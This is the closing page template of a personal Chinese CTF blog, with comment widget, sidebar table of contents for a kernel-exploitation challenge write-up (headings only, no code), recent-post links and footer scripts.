class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://imgtu.com/i/731OZF" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">aYoung</div><div class="author-info__description">aYoung的博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aYoung-CS"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/aYoung-CS" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">好好学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level1-0"><span class="toc-number">2.</span> <span class="toc-text">level1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#init-module"><span class="toc-number">2.1.</span> <span class="toc-text">init_module</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#device-open"><span class="toc-number">2.2.</span> <span class="toc-text">device_open</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#device-read"><span class="toc-number">2.3.</span> <span class="toc-text">device_read</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#device-write"><span class="toc-number">2.4.</span> <span class="toc-text">device_write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.5.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level1-1"><span class="toc-number">3.</span> <span class="toc-text">level1.1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">3.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level2-0"><span class="toc-number">4.</span> <span class="toc-text">level2.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#device-write-1"><span class="toc-number">4.1.</span> <span class="toc-text">device_write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-2"><span class="toc-number">4.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level2-1"><span class="toc-number">5.</span> <span class="toc-text">level2.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level3-0"><span class="toc-number">6.</span> <span class="toc-text">level3.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#device-write-2"><span class="toc-number">6.1.</span> <span class="toc-text">device_write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#win"><span class="toc-number">6.2.</span> <span class="toc-text">win</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-3"><span class="toc-number">6.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level3-1"><span class="toc-number">7.</span> <span class="toc-text">level3.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level4-0"><span class="toc-number">8.</span> <span class="toc-text">level4.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#device-ioctl"><span class="toc-number">8.1.</span> <span class="toc-text">device_ioctl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-4"><span class="toc-number">8.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level4-1"><span class="toc-number">9.</span> <span class="toc-text">level4.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level5-0"><span class="toc-number">10.</span> <span class="toc-text">level5.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#device-ioctl-1"><span class="toc-number">10.1.</span> <span class="toc-text">device_ioctl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">10.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-5"><span class="toc-number">10.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level5-1"><span class="toc-number">11.</span> <span class="toc-text">level5.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level6-0"><span class="toc-number">12.</span> <span class="toc-text">level6.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#device-write-3"><span class="toc-number">12.1.</span> <span class="toc-text">device_write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">12.2.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#prepare-kernel-cred"><span class="toc-number">12.2.1.</span> <span class="toc-text">prepare_kernel_cred</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#commit-creds"><span class="toc-number">12.2.2.</span> <span class="toc-text">commit_creds</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-6"><span class="toc-number">12.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level6-1"><span class="toc-number">13.</span> <span class="toc-text">level6.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level7-0"><span class="toc-number">14.</span> <span class="toc-text">level7.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#init-module-1"><span class="toc-number">14.1.</span> <span class="toc-text">init_module</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#device-ioctl-2"><span class="toc-number">14.2.</span> <span class="toc-text">device_ioctl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-7"><span class="toc-number">14.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">14.4.</span> <span class="toc-text">后记</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level7-1"><span class="toc-number">15.</span> <span class="toc-text">level7.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level8-0"><span class="toc-number">16.</span> <span class="toc-text">level8.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#background"><span class="toc-number">16.1.</span> <span class="toc-text">background</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">16.2.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#device-write-4"><span class="toc-number">16.2.1.</span> <span class="toc-text">device_write</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">16.3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-8"><span class="toc-number">16.4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0-1"><span class="toc-number">16.5.</span> <span class="toc-text">后记</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level8-1"><span class="toc-number">17.</span> <span class="toc-text">level8.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level9-0"><span class="toc-number">18.</span> <span class="toc-text">level9.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#device-write-5"><span class="toc-number">18.1.</span> <span class="toc-text">device_write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="toc-number">18.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-9"><span class="toc-number">18.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level9-1"><span class="toc-number">19.</span> <span class="toc-text">level9.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level10-0"><span class="toc-number">20.</span> <span class="toc-text">level10.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-10"><span class="toc-number">20.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level10-1"><span class="toc-number">21.</span> <span class="toc-text">level10.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level11-0"><span class="toc-number">22.</span> <span class="toc-text">level11.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#device-write-6"><span class="toc-number">22.0.1.</span> <span class="toc-text">device_write</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">22.1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#load-flag"><span class="toc-number">22.1.1.</span> <span class="toc-text">load_flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">22.2.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-11"><span class="toc-number">22.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0-2"><span class="toc-number">22.4.</span> <span class="toc-text">后记</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level11-1"><span class="toc-number">23.</span> <span class="toc-text">level11.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level12-0"><span class="toc-number">24.</span> <span class="toc-text">level12.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-number">24.1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#load-file"><span class="toc-number">24.1.1.</span> <span class="toc-text">load_file</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-12"><span class="toc-number">24.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level12-1"><span class="toc-number">25.</span> <span class="toc-text">level12.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">26.</span> <span class="toc-text">写在最后</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/04/25/%E3%80%90WP%E3%80%91TSCTF2022-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="【WP】TSCTF2022-Pwn部分题解"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】TSCTF2022-Pwn部分题解"/></a><div class="content"><a class="title" href="/2022/04/25/%E3%80%90WP%E3%80%91TSCTF2022-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="【WP】TSCTF2022-Pwn部分题解">【WP】TSCTF2022-Pwn部分题解</a><time datetime="2022-04-25T13:49:56.000Z" title="发表于 2022-04-25 21:49:56">2022-04-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/18/%E3%80%90WP%E3%80%91XCTF-CTFpwn%E9%A2%98/" title="【WP】XCTF-*CTFpwn题"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】XCTF-*CTFpwn题"/></a><div class="content"><a class="title" href="/2022/04/18/%E3%80%90WP%E3%80%91XCTF-CTFpwn%E9%A2%98/" title="【WP】XCTF-*CTFpwn题">【WP】XCTF-*CTFpwn题</a><time datetime="2022-04-18T06:40:51.000Z" title="发表于 2022-04-18 14:40:51">2022-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/10/%E3%80%90WP%E3%80%912022%E8%BD%A6%E8%81%94%E7%BD%91/" title="【WP】2022车联网"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】2022车联网"/></a><div class="content"><a class="title" href="/2022/04/10/%E3%80%90WP%E3%80%912022%E8%BD%A6%E8%81%94%E7%BD%91/" title="【WP】2022车联网">【WP】2022车联网</a><time datetime="2022-04-10T11:24:49.000Z" title="发表于 2022-04-10 19:24:49">2022-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/07/%E3%80%90WP%E3%80%912022midnightctf-%E9%83%A8%E5%88%86pwn%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" title="【WP】2022midnightctf_部分pwn复现学习"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】2022midnightctf_部分pwn复现学习"/></a><div class="content"><a class="title" href="/2022/04/07/%E3%80%90WP%E3%80%912022midnightctf-%E9%83%A8%E5%88%86pwn%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" title="【WP】2022midnightctf_部分pwn复现学习">【WP】2022midnightctf_部分pwn复现学习</a><time datetime="2022-04-07T08:18:23.000Z" title="发表于 2022-04-07 16:18:23">2022-04-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/22/%E3%80%90WP%E3%80%91tqlctf2022-pwn/" title="【WP】tqlctf2022-Pwn"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】tqlctf2022-Pwn"/></a><div class="content"><a class="title" href="/2022/02/22/%E3%80%90WP%E3%80%91tqlctf2022-pwn/" title="【WP】tqlctf2022-Pwn">【WP】tqlctf2022-Pwn</a><time datetime="2022-02-22T12:14:22.000Z" title="发表于 2022-02-22 20:14:22">2022-02-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By aYoung</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: 'L7cFgIQhurvmmSexryctex39-MdYXbMMI',
      appKey: 'EG1BbRP3FTdnTfn0QeeeIDii',
      placeholder: 'Please leave your footprints',
      avatar: 'robohash',
      meta: 'nick/mail/link'.split(','),
      pageSize: '10',
      avatar_cdn: 'https://www.gravatar.com/avatar/',
      lang: 'zh-CN',
      recordIP: true,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: true,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick/mail'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign(initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>